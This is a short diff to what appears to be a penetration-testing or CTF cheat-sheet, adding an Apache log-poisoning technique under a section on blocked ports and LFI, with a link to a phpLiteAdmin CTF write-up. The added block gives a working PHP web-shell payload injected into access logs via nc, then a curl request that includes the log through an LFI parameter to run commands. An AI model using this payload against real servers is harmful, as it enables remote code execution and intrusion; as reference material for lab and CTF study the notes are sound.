@@ -556,6 +556,17 @@ Apache
 * Can't access an alt HTTP(S) port (8080, 443)?
     * User agent possibly blocked?
     * If LFI exists, check `httpd.config` -> change user agent to accepted one.
+* Log file injection
+```bash
+# Inject code into logs
+$ nc <IP> <port>
+GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
+Host: <IP>
+Connection: close
+
+# Use LFI to execute commands
+$ curl http://target.com?lfi_file=/var/log/apache2/access.log&cmd=<command>
+```
 
 phpLiteAdmin 1.9.3 Remote PHP Code Injection:
 * https://v3ded.github.io/ctf/zico2.html
